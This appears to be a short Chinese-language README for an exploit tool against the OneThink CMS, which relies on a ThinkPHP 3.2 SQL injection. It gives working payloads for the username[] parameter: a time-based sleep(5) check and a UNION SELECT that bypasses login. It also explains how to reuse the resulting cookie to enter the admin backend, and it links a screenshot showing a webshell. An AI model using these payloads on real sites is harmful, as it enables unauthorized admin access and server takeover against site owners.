# onethink_rce


十一假期看到的文章https://forum.90sec.com/t/topic/464

原理其实还是p牛发的那个thinkphp3.2注入漏洞，于是又简单的分析了一下。

写了一下利用工具。


需要注意的地方：
1、url = "http://www.xxx.com"    不解释  
2、print(s.cookies)              如果登录成功，那么这个打印出来的cookie就有用，替换cookie即可进入后台
3、payload 中的 ('username[]','like 1)and 1 in (2) or sleep(5)#'),  为注入漏洞的延时检测。
               ('username[]','like 1)and 1 in (2) union select 1,2,"",4,5,6,7,8,9,10,11#'), 为绕过验证登录语句
               字段数默认为11，我也见过13的。大家自行修改。
               

GETSHELL：
[](https://github.com/yuxiaokui/onethink_rce/blob/master/getshell.jpeg?raw=true)
